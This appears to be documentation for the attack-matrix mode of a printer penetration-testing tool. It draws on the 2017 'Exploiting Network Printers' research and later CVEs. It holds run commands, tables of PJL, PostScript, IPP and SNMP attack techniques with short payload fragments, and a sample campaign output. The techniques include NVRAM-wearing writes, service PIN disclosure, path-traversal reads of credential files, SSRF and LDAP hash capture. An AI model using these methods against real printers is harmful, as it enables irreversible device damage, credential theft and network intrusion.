# Attack Matrix

The `--attack-matrix` flag runs a full automated campaign based on the Müller et al. 2017 BlackHat research paper ("Exploiting Network Printers") plus 2024-2025 CVEs. It covers every documented attack category across all supported protocols.

---

## Usage

```bash
# Dry-run (default) - probes all attack vectors without destructive actions
python printer-reaper.py 192.168.1.100 --attack-matrix

# Live exploitation - AUTHORIZED LABS ONLY - some actions are irreversible
python printer-reaper.py 192.168.1.100 --attack-matrix --no-dry

# Combined with network mapping (single pass)
python printer-reaper.py 192.168.1.100 --attack-matrix --network-map

# With debug output (show raw bytes)
python printer-reaper.py 192.168.1.100 --attack-matrix --debug
```

---

## Attack Categories

### Denial of Service

| Attack | Technique | Protocol | Reversible |
|--------|-----------|----------|------------|
| PostScript infinite loop | `{} loop` via exitserver | PS / RAW | Power cycle only |
| showpage redefinition | PS exitserver operator | PS | Power cycle only |
| Offline mode | `@PJL ENTER LANGUAGE=UNSUPPORTED` | PJL | `@PJL ENTER LANGUAGE=PCL` |
| NVRAM exhaustion | `@PJL DEFAULT COPIES=999999` repeated | PJL | No (physical wear) |
| FORMLINES crash | CVE-2024-51982 — malformed FORMLINES | PJL | Power cycle |
| IPP queue purge | IPP Cancel-Job 0x0012 all jobs | IPP | No (jobs lost) |
| Memory exhaustion | Large PS array allocation | PS | Power cycle |

### Protection Bypass

| Attack | Technique | Protocol |
|--------|-----------|----------|
| Password disclosure | `@PJL INFO VARIABLES` lists SERVICE PIN | PJL |
| Factory reset (HP) | `@PJL DMCMD ASCIIHEX=...` | PJL |
| Factory reset (Ricoh) | SNMP SET to reset OID | SNMP |
| exitserver unlock | PS `statusdict begin startjob` | PS |
| SNMP SET reset | Write community `@resetMIB` | SNMP |
| HTTP auth bypass | CVE-2022-3426, CVE-2019-14308 | HTTP |
| Session fixation | CVE-2023-27516 | HTTP |

### Job Manipulation

| Attack | Technique | Protocol |
|--------|-----------|----------|
| Page overlay | PS `showpage` redefinition + stamp | PS |
| Job capture start | PS exitserver + input filter | PS |
| Captured job retrieval | Read from PS capturedict | PS |
| Job deletion | IPP Cancel-Job / Purge-Jobs | IPP |
| Text replacement | PS font redefinition | PS |
| Print storm | Loop print job injection | PJL / IPP |

### Information Disclosure

| Attack | Technique | Protocol |
|--------|-----------|----------|
| PJL variable dump | `@PJL INFO VARIABLES` | PJL |
| PJL ID + serial | `@PJL INFO ID`, `@PJL USTATUS DEVICE` | PJL |
| Filesystem listing | PS `filenameforall` | PS |
| File read (traversal) | `@PJL FSUPLOAD` + `../` | PJL |
| SNMP MIB walk | 2000+ OIDs including stored job metadata | SNMP |
| Saved print job retrieval | FTP + web file manager | FTP / HTTP |
| CORS/XSP spoofing | Print PS job from victim browser | HTTP + PS |
| Credential files | `/webServer/config/soe.xml` read | PJL / PS |
| NVRAM dump | `@PJL NVRAMREAD` | PJL |

### Network Attacks

| Attack | Technique | Protocol |
|--------|-----------|----------|
| SSRF via IPP | Send job to `ipp://internal-host/` | IPP |
| SSRF via WSD | WSD Print operation with internal URL | WSD |
| LDAP hash capture | Redirect LDAP server to rogue host | HTTP |
| DNS rebinding | Via EWS LDAP config redirect | HTTP |
| Subnet scan | Printer scans via SSRF | IPP / WSD |
| Routing table exfiltration | SNMP route OID walk | SNMP |

---

## Full Campaign Output Example

```
====================================================================
ATTACK MATRIX CAMPAIGN — 192.168.1.100 (EPSON L3250)
====================================================================
Mode: DRY-RUN (add --no-dry to execute live attacks)

[1/6] DoS — PostScript Infinite Loop
  Method: @PJL ENTER LANGUAGE=PS; { } loop
  Status: [~] DRY-RUN — payload ready, not sent

[2/6] DoS — NVRAM Damage via PJL
  Method: @PJL DEFAULT COPIES=999999 (repeated write)
  Status: [~] DRY-RUN — payload ready, not sent

[3/6] Protection Bypass — PJL Variable Disclosure
  @PJL INFO VARIABLES response:
  SERVICEPIN=0000
  COPIES=1  RESOLUTION=360  ...
  Status: [+] EXPOSED — SERVICEPIN in plaintext

[4/6] Job Manipulation — Capture Active Jobs (PS)
  Status: [~] DRY-RUN — exitserver payload ready

[5/6] Info Disclosure — Filesystem via PS filenameforall
  Files found:
    /webServer/config/soe.xml
    /EpsonInternal/networkConfig.xml
    /opt/EpsonInternal/userAccount.xml
  Status: [+] FILESYSTEM ACCESSIBLE

[6/6] Network — SSRF via IPP
  Probe: ipp://192.168.1.1/ipp (internal gateway via printer)
  Status: [+] SSRF POSSIBLE — gateway responded through printer

====================================================================
CAMPAIGN SUMMARY
====================================================================
  Total checks  : 19
  Vulnerable    : 7
  Dry-run only  : 12
  Not affected  : 0
```

---

## Relationship to BlackHat 2017 Research

The attack matrix is directly derived from:

> Müller, J., Noss, M., Mladenov, V., Mainka, C., Schwenk, J.
> *Exploiting Network Printers*
> BlackHat USA 2017

The paper identifies 4 main attack categories (DoS, Protection Bypass, Job Manipulation, Information Disclosure) across PJL, PostScript, PCL, and network protocols. PrinterReaper implements all documented techniques plus additional CVEs from 2022-2025.

Reference: [PDF](https://blackhat.com/docs/us-17/thursday/us-17-Mueller-Exploiting-Network-Printers.pdf) | [Hacking Printers Wiki](http://hacking-printers.net)
